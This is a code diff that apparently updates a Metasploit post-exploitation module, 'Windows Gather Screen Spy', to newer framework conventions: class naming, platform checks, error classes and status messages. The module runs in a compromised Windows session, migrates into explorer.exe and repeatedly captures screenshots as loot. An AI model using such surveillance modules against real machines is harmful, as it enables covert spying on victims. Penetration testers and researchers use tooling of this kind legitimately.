@@ -1,12 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rbconfig'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   def initialize(info={})
     super( update_info(info,
       'Name'           => 'Windows Gather Screen Spy',
@@ -38,7 +37,7 @@ class Metasploit3 < Msf::Post
         OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),
         OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),
         OptBool.new('RECORD', [true, 'Record all screenshots to disk by looting them', true])
-      ], self.class)
+      ])
   end
 
   def view_screenshots?
@@ -54,8 +53,8 @@ class Metasploit3 < Msf::Post
     screenshot = Msf::Config.get_config_root + "/logs/" + host + ".jpg"
 
     migrate_explorer
-    if session.platform !~ /win32|win64/i
-      print_error("Unsupported Platform")
+    if session.platform !~ /windows/i
+      print_error('Unsupported Platform')
       return
     end
 
@@ -76,7 +75,7 @@ class Metasploit3 < Msf::Post
         select(nil, nil, nil, datastore['DELAY'])
         begin
           data = session.espia.espia_image_get_dev_screen
-        rescue RequestError => e
+        rescue Rex::Post::Meterpreter::RequestError => e
           print_error("Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
           return false
         end
@@ -135,10 +134,10 @@ class Metasploit3 < Msf::Post
         print_status("Migrating to explorer.exe pid: #{p['pid']}")
         begin
           session.core.migrate(p['pid'].to_i)
-          print_status("Migration successful")
+          print_good("Migration successful")
           return p['pid']
         rescue
-          print_status("Migration failed.")
+          print_bad("Migration failed")
           return nil
         end
       end
